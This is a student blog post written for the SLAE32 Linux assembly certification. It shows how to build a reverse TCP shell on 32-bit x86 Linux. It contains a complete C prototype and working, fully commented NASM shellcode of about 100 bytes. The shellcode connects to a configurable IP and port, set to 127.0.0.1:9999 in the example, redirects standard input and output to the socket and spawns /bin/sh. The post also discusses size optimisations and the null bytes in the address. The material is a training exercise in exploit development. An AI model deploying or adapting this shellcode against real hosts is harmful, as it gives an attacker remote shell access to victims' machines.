---
layout: page
title: SLAE32 Assignment 2
---

<div class="well" markdown="1">
<h2>SLAE32 Assignment 2: Reverse TCP Shell</h2>

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1009

The second assignment is to create a reverse tcp shell, with a configurable IP and port. In the first assignment, I opted for features over brevity. In this case, I aim to make the shellcode as short as possible.

Based on the [last assignment](/SLAE32/slae32-assignment1), one important structure that I will need is the `sockaddr_in` struct. The first byte will again be a 2, the second byte will be 0, the next two bytes will be the port, the next four bytes will be the IP address, then there will be 8 null bytes. This is what will get passed to the connect system call. Of course, I wanted to verify this as well as find the socketcall number, so again I created a C program to perform the reverse shell.

```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(){
	char *execargs[] = {"/bin//sh", 0};
	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
	sa.sin_port = htons(9999);
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	connect(sock, (const struct sockaddr *) &sa, 16);
	dup2(sock,0);
	dup2(sock,1);
	dup2(sock,2);
	execve(execargs[0], execargs, 0);
}
```

Running it through gdb as before shows that the socketcall number for `connect` is 3. This can be confirmed by looking at /usr/include/linux/net.h

```
#define SYS_CONNECT     3               /* sys_connect(2)               */
```
Based on this information, as well as what was learned in the first assignment, I was able to write the assembly code. For whatever reason, this one took a lot more debugging. In any case, here is the assembly file, with copious comments to explain each step.

```nasm
; Filename: shell_bind_fork_tcp.nasm
; Author:  Mark Shaneck
; Website:  http://markshaneck.com
;
; Purpose: The purpose of this shellcode connect back
; to a host and port of our choosing

global _start

section .text
_start:

	; First things first, call socket
	; need to call socketcall with args 1, and domain (2), type (1), protocol(6)
	push byte 6 ; protocol = IPPROTO_TCP
	push byte 1 ; type = SOCK_STREAM
	push byte 2 ; domain = AF_INET
	xor eax, eax
	mov al, 102 ; syscall - socketcall
	xor ebx,ebx
	mov bl, 1   ; socket sockcall type
	mov ecx, esp ; pointer to the args
	int 0x80

	; eax now contains the socket file descriptor

	; let's dup the stdio FDs
	pop ecx ; we are going to loop from 2 to 0, and 2 happens to be on the top of the stack
	mov ebx,eax ; put socket file descriptor in ebx
dup:
	mov al, 63 ; dup2 syscall
	int 0x80
	dec ecx
	cmp cl,0xff
	jne dup

	; now we call connect
	; we need the socket file descriptor, a pointer to the sockaddr structure and a 16
	; perform a jmp-call-pop to get the port number so that it is easily configurable
	jmp short get_sockaddr

got_sockaddr:
	pop ecx               ; put address of sockaddr struct into ecx
	mov edx,[ecx+2]
	push edx              ; push the ip address next
	mov dx, word [ecx]    ; put the port into ebx
	shl edx,16            ; move the port number to the higher order bytes
	add dl,2              ; put the socket family in there
	push edx

	mov edx, esp ; now ebx has the address of the sockaddr_in struct
	push byte 0x10
	push edx
	push ebx
	mov ecx, esp
	xor ebx,ebx
	mov bl, 3   ; connect sockcall type
	mov al, 102 ; syscall - socketcall
	int 0x80

	; we should now be connected

	; execve the shell using stack method
	; let's execute sh
	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f

	mov ebx,esp ; pointer to "/bin//sh"
	push eax
	mov edx,esp ; env pointer (NULL)

	push ebx
	mov ecx,esp ; pointer to [pointer to "/bin//sh", 0]

	mov al, 11 ; execve syscall
	int 0x80

get_sockaddr:
	call got_sockaddr
	sockaddr: db 0x27, 0x0f, 0x7f, 0x00, 0x00, 0x01
	; should we worry about the nulls in the ip addr?
```

Compiling and pasting the shellcode into the shellcode stub resulted in a functioning reverse tcp shell.

{% include image name="functional_shellcode.png" width="100%" %}

Total shellcode length was exactly 100 bytes, which was an improvement from my initial straightforward attempt, which was somewhere around 120 bytes. I tried to break the arbitrary 100 byte boundary, but I ran out of ways to shorten it any further. I could probably save a few more bytes by placing the ip address and port in the middle of the program and not using the jmp-call-pop technique to get its location, but I wanted to leave that in for ease of configuration.

Some of the improvements I made in this shellcode, as compared to assignment 1, aside from extra features, was pushing hardcoded bytes onto the stack directly, instead of loading them into registers and pushing those. The other major improvement I made to save some space was to rearrange the functions. Namely, putting `dup2` just after `socket` allowed for reuse of some registers, as the values were already in them.

One limitation of the shellcode is in the IP address. It is placed at the end and it is not encoded. That means that you cannot put an IP address as the destination that contains a null byte. At least, that is, if you need to avoid null bytes. As you can see in my example, I have two null bytes, since I was connecting to 127.0.0.1. However, I didn't want to add the additional complexity of encoding, plus any sort of simple encoding would require some byte to be disallowed from the IP address. The idea that I had was that you could put an encoding byte just after the IP address, and have the shellcode use that byte to decode the address. That way, it could be configurable, along with the IP, and so you could choose a byte that isn't in the address you were connecting to. 

</div>
